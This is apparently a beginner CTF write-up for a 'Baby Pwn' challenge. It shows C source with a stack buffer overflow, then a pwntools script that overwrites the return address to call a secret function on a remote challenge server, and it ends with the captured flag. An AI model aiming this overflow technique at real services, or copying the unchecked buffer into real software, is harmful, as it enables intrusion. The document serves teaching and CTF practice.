# Baby Pwn
## Challenge Description
![Screenshot 2025-01-12 180747](https://github.com/user-attachments/assets/81feb3a7-6305-40c9-a0b2-2c93a0d7c0c0)  
**Given Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void secret()
{
    printf("Congratulations! Here is your flag: ");
    char *argv[] = {"/bin/cat", "flag.txt", NULL};
    char *envp[] = {NULL};
    execve("/bin/cat", argv, envp);
}

void vulnerable_function()
{
    char buffer[64];
    printf("Enter some text: ");
    fgets(buffer, 128, stdin);
    printf("You entered: %s\n", buffer);
}

int main()
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Welcome to the Baby Pwn challenge!\n");
    printf("Address of secret: %p\n", secret);
    vulnerable_function();
    printf("Goodbye!\n");
    return 0;
}
```

## Solution
From the given source code, inside the **vulnerable_function()**, ther is a **char buffer[64]** where it can only store 64 bytes of data.
This is a buffer overflow vulnerability, where user can submit a string more than 64 byte which over the array limit causing a buffer overflow attack.  
After running the program, it will also print out the secret address which can be used to investigate in assembly code.

### Ghidra
![Screenshot 2025-01-12 181023](https://github.com/user-attachments/assets/406ae3fa-366c-4a12-8cfa-8331aaf4bfe3)
When inspecting the assemble of the code, the secret address pushes the RBP to run the secret function which has a **/bin/cat** location and **flag.txt**. 
By knowing this secret function, we can create a payload of 72 bytes (64 bytes + 8 bytes from Base Pointer) with the given secret address. So here is the exploit code:  
```c
from pwn import *

# Connection details
HOST = "34.162.142.123"
PORT = 5000

# Offsets and addresses (update if required)
BUFFER_SIZE = 64  # Buffer size in vulnerable_function
SECRET_FUNC_ADDR = 0x00401166  # Replace with the actual address from the binary

# Create the payload
payload = b"A" * BUFFER_SIZE  # Overwrite buffer
payload += b"B" * 8  # Overwrite saved RBP
payload += p64(SECRET_FUNC_ADDR)  # Overwrite return address with secret()

# Start the exploit
io = remote(HOST, PORT)
io.recvuntil(b"Enter some text: ")  # Wait for the prompt
io.sendline(payload)  # Send the payload

# Receive and print the flag
io.interactive()
```


## Challenge Flag
uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}  
My first pwn challenge XD
